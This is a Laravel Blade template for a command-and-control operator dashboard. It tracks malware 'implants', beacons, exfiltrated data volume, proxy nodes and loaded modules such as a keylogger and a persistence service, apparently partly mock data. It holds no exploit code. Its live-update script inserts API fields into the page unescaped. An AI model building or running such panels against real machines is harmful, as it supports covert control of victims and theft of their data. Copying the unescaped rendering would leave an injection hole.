@extends('layouts.app')

@section('title', 'Command Dashboard')

@section('content')
<div class="grid grid-4" style="margin-bottom: 30px;">
    <div class="panel">
        <div class="panel-body" style="text-align: center;">
            <div class="stat-value" id="stat-total">{{ $stats['total_implants'] }}</div>
            <div class="stat-label">Total Implants</div>
        </div>
    </div>
    <div class="panel">
        <div class="panel-body" style="text-align: center;">
            <div class="stat-value" id="stat-active" style="color: #00ff88;">{{ $stats['active'] }}</div>
            <div class="stat-label">Active</div>
        </div>
    </div>
    <div class="panel">
        <div class="panel-body" style="text-align: center;">
            <div class="stat-value" id="stat-dormant" style="color: #ffcc00;">{{ $stats['dormant'] }}</div>
            <div class="stat-label">Dormant</div>
        </div>
    </div>
    <div class="panel">
        <div class="panel-body" style="text-align: center;">
            <div class="stat-value" id="stat-offline" style="color: #ff4444;">{{ $stats['offline'] }}</div>
            <div class="stat-label">Offline</div>
        </div>
    </div>
</div>

<div class="grid grid-2">
    <div>
        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Active Implants</span>
                <span style="color: #666; font-size: 0.8em;">{{ count($implants) }} registered</span>
            </div>
            <div class="panel-body" style="padding: 0;">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>Hostname</th>
                            <th>OS</th>
                            <th>Last Beacon</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody id="implants-tbody">
                        @foreach($implants as $implant)
                        <tr>
                            <td>
                                <a href="{{ route('implant.show', $implant['id']) }}">{{ $implant['hostname'] }}</a>
                            </td>
                            <td style="color: #666;">{{ Str::limit($implant['os'], 20) }}</td>
                            <td style="color: #666;">{{ \Carbon\Carbon::parse($implant['last_beacon'])->diffForHumans() }}</td>
                            <td>
                                <span class="badge badge-{{ $implant['status'] }}">{{ $implant['status'] }}</span>
                            </td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">System Metrics</span>
            </div>
            <div class="panel-body">
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                    <div>
                        <div style="color: #666; font-size: 0.75em; text-transform: uppercase;">Data Exfiltrated</div>
                        <div id="metric-exfil" style="color: #00ccff; font-size: 1.2em;">{{ $stats['total_data_exfil'] }}</div>
                    </div>
                    <div>
                        <div style="color: #666; font-size: 0.75em; text-transform: uppercase;">Uptime</div>
                        <div id="metric-uptime" style="color: #00ccff; font-size: 1.2em;">{{ $stats['uptime'] }}</div>
                    </div>
                    <div>
                        <div style="color: #666; font-size: 0.75em; text-transform: uppercase;">C2 Health</div>
                        <div id="metric-c2" style="color: #00ff88; font-size: 1.2em;">{{ strtoupper($stats['c2_health'] ?? 'nominal') }}</div>
                    </div>
                    <div>
                        <div style="color: #666; font-size: 0.75em; text-transform: uppercase;">Packets/s</div>
                        <div id="metric-pps" style="color: #00ccff; font-size: 1.2em;">{{ $stats['packets_per_s'] ?? '—' }}</div>
                    </div>
                </div>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Beacon Telemetry (Aggregate)</span>
                <span style="color:#666; font-size:0.8em;">Rolling 3s window</span>
            </div>
            <div class="panel-body">
                <div style="display:grid; gap:12px;">
                    <div>
                        <div style="display:flex; justify-content:space-between; font-size:0.8em;">
                            <span style="color:#666;">CPU</span>
                            <span id="agg-cpu" style="color:#00ccff;">{{ $stats['agg_cpu'] ?? 0 }}%</span>
                        </div>
                        <div class="metric-bar"><div id="agg-cpu-bar" class="metric-bar-fill" style="width: {{ $stats['agg_cpu'] ?? 0 }}%;"></div></div>
                    </div>
                    <div>
                        <div style="display:flex; justify-content:space-between; font-size:0.8em;">
                            <span style="color:#666;">MEM</span>
                            <span id="agg-mem" style="color:#00ccff;">{{ $stats['agg_mem'] ?? 0 }}%</span>
                        </div>
                        <div class="metric-bar"><div id="agg-mem-bar" class="metric-bar-fill" style="width: {{ $stats['agg_mem'] ?? 0 }}%;"></div></div>
                    </div>
                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:12px;">
                        <div>
                            <div style="display:flex; justify-content:space-between; font-size:0.8em;">
                                <span style="color:#666;">NET ↓</span>
                                <span id="agg-net-in" style="color:#00ff88;">{{ $stats['net_in_mbps'] ?? 0 }} Mbps</span>
                            </div>
                            <div class="metric-bar"><div id="agg-net-in-bar" class="metric-bar-fill" style="width: {{ min(100, (int)(($stats['net_in_mbps'] ?? 0) / 4)) }}%;"></div></div>
                        </div>
                        <div>
                            <div style="display:flex; justify-content:space-between; font-size:0.8em;">
                                <span style="color:#666;">NET ↑</span>
                                <span id="agg-net-out" style="color:#ffcc00;">{{ $stats['net_out_mbps'] ?? 0 }} Mbps</span>
                            </div>
                            <div class="metric-bar"><div id="agg-net-out-bar" class="metric-bar-fill" style="width: {{ min(100, (int)(($stats['net_out_mbps'] ?? 0) / 3)) }}%;"></div></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Encryption Status</span>
            </div>
            <div class="panel-body">
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                    <div>
                        <div style="color: #666; font-size: 0.75em; text-transform: uppercase;">Cipher Suite</div>
                        <div style="color: #00ff88; font-size: 0.9em;">AES-256-GCM</div>
                    </div>
                    <div>
                        <div style="color: #666; font-size: 0.75em; text-transform: uppercase;">Key Rotation</div>
                        <div style="color: #00ccff; font-size: 0.9em;">72h cycle</div>
                    </div>
                    <div>
                        <div style="color: #666; font-size: 0.75em; text-transform: uppercase;">TLS Version</div>
                        <div style="color: #00ff88; font-size: 0.9em;">1.3</div>
                    </div>
                    <div>
                        <div style="color: #666; font-size: 0.75em; text-transform: uppercase;">Perfect Forward</div>
                        <div style="color: #00ff88; font-size: 0.9em;">ENABLED</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div>
        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Operations Log</span>
                <span id="log-status" style="color: #666; font-size: 0.8em;">Live Feed</span>
            </div>
            <div class="panel-body" id="ops-log">
                @foreach($logs as $log)
                <div class="log-entry">
                    <span class="log-timestamp">{{ \Carbon\Carbon::parse($log['timestamp'])->format('H:i:s') }}</span>
                    <span class="log-event">[{{ $log['event'] }}]</span>
                    <span class="log-source">{{ $log['source'] }}</span>
                    <br>
                    <span style="color: #888; margin-left: 80px;">{{ $log['details'] }}</span>
                </div>
                @endforeach
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Threat Map</span>
            </div>
            <div class="panel-body" style="height: 200px; display: flex; align-items: center; justify-content: center;">
                <pre style="color:#00ff88; font-size:0.72em; line-height:1.25; text-align:left;">
      ┌───────────── GLOBAL OP GRID ─────────────┐
      │ NA-EAST   [███████▉  ] 78%  ● ACTIVE    │
      │ EU-WEST   [██████░░  ] 63%  ● ACTIVE    │
      │ AP-SOUTH  [████░░░░  ] 41%  ● ACTIVE    │
      │ SA-EAST   [███░░░░░  ] 33%  ○ STANDBY   │
      │ AF-NORTH  [██░░░░░░  ] 21%  ○ STANDBY   │
      └─────────────────────────────────────────┘
                </pre>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Recent Modules</span>
            </div>
            <div class="panel-body">
                <table class="data-table" style="font-size: 0.8em;">
                    <tr>
                        <td style="color: #666;">keylogger.dll</td>
                        <td style="color: #00ff88;">loaded</td>
                        <td style="color: #666;">2m ago</td>
                    </tr>
                    <tr>
                        <td style="color: #666;">screenshot.so</td>
                        <td style="color: #00ff88;">loaded</td>
                        <td style="color: #666;">5m ago</td>
                    </tr>
                    <tr>
                        <td style="color: #666;">persist_svc.exe</td>
                        <td style="color: #ffcc00;">pending</td>
                        <td style="color: #666;">8m ago</td>
                    </tr>
                    <tr>
                        <td style="color: #666;">exfil_ftp.bin</td>
                        <td style="color: #00ff88;">loaded</td>
                        <td style="color: #666;">12m ago</td>
                    </tr>
                </table>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <span class="panel-title">Network Topology</span>
            </div>
            <div class="panel-body">
                <div style="font-size: 0.75em; color: #666;">
                    <div style="margin-bottom: 8px;">
                        <span style="color: #00ccff;">●</span> C2-PRIMARY 
                        <span style="float: right; color: #00ff88;">online</span>
                    </div>
                    <div style="margin-bottom: 8px; padding-left: 15px;">
                        <span style="color: #666;">├─</span> PROXY-EU-1 
                        <span style="float: right; color: #00ff88;">online</span>
                    </div>
                    <div style="margin-bottom: 8px; padding-left: 15px;">
                        <span style="color: #666;">├─</span> PROXY-NA-1 
                        <span style="float: right; color: #00ff88;">online</span>
                    </div>
                    <div style="margin-bottom: 8px; padding-left: 15px;">
                        <span style="color: #666;">├─</span> PROXY-AP-1 
                        <span style="float: right; color: #ffcc00;">degraded</span>
                    </div>
                    <div style="padding-left: 15px;">
                        <span style="color: #666;">└─</span> PROXY-SA-1 
                        <span style="float: right; color: #ff4444;">offline</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
(function(){
  var e=function(t){return document.getElementById(t)},
  n=e("stat-total"),o=e("stat-active"),a=e("stat-dormant"),
  s=e("stat-offline"),r=e("metric-exfil"),i=e("metric-uptime"),
  l=e("metric-c2"),c=e("metric-pps"),u=e("agg-cpu"),d=e("agg-mem"),
  p=e("agg-net-in"),m=e("agg-net-out"),f=e("agg-cpu-bar"),
  g=e("agg-mem-bar"),h=e("agg-net-in-bar"),v=e("agg-net-out-bar"),
  b=e("implants-tbody"),y=e("ops-log"),w=e("log-status"),
  x=function(t){return"active"===t?"badge-active":"dormant"===t?"badge-dormant":"offline"===t?"badge-offline":"badge-active"},
  k=function(t){if(t<60)return t+"s ago";var e=Math.floor(t/60);return e<60?e+"m ago":Math.floor(e/60)+"h ago"},
  C=function(t){var e=Date.parse(t);return Number.isNaN(e)?"—":k(Math.max(0,Math.floor((Date.now()-e)/1e3)))},
  S=function(t){Array.isArray(t)&&(b.innerHTML=t.map(function(t){var e=(t.os||"").slice(0,20),n=C(t.last_beacon),o=(t.status||"active").toLowerCase();return'<tr><td><a href="/implant/'+t.id+'">'+t.hostname+'</a></td><td style="color:#666;">'+e+'</td><td style="color:#666;">'+n+'</td><td><span class="badge '+x(o)+'">'+o+"</span></td></tr>"}).join(""))},
  E=function(t){if(Array.isArray(t)){y.innerHTML=t.map(function(t){var e=t.timestamp?new Date(t.timestamp):new Date,n=String(e.getUTCHours()).padStart(2,"0"),o=String(e.getUTCMinutes()).padStart(2,"0"),a=String(e.getUTCSeconds()).padStart(2,"0");return'<div class="log-entry"><span class="log-timestamp">'+n+":"+o+":"+a+'</span><span class="log-event">['+t.event+']</span><span class="log-source">'+t.source+'</span><br><span style="color:#888; margin-left: 80px;">'+t.details+"</span></div>"}).join("")}},
  T=0;
  async function q(){try{var t=await fetch("/api/overview?log_limit=10",{headers:{Accept:"application/json"}});if(!t.ok)throw new Error("HTTP "+t.status);var e=await t.json();if(!e||!0!==e.ok)throw new Error("Bad payload");var A=e.stats||{};n&&(n.textContent=A.total_implants??"—"),o&&(o.textContent=A.active??"—"),a&&(a.textContent=A.dormant??"—"),s&&(s.textContent=A.offline??"—"),r&&(r.textContent=A.total_data_exfil??"—"),i&&(i.textContent=A.uptime??"—"),l&&(l.textContent=String(A.c2_health??"nominal").toUpperCase()),c&&(c.textContent=A.packets_per_s??"—"),u&&(u.textContent=(A.agg_cpu??0)+"%"),d&&(d.textContent=(A.agg_mem??0)+"%"),p&&(p.textContent=(A.net_in_mbps??0)+" Mbps"),m&&(m.textContent=(A.net_out_mbps??0)+" Mbps"),f&&(f.style.width=(A.agg_cpu??0)+"%"),g&&(g.style.width=(A.agg_mem??0)+"%"),h&&(h.style.width=Math.min(100,Math.floor((A.net_in_mbps??0)/4))+"%"),v&&(v.style.width=Math.min(100,Math.floor((A.net_out_mbps??0)/3))+"%"),S(e.implants),E(e.logs),T=0,w&&(w.textContent="Live Feed")}catch(t){T++,w&&(w.textContent="Link jitter ("+T+")")}}
  q(),setInterval(q,3e3);
})();
</script>
@endsection
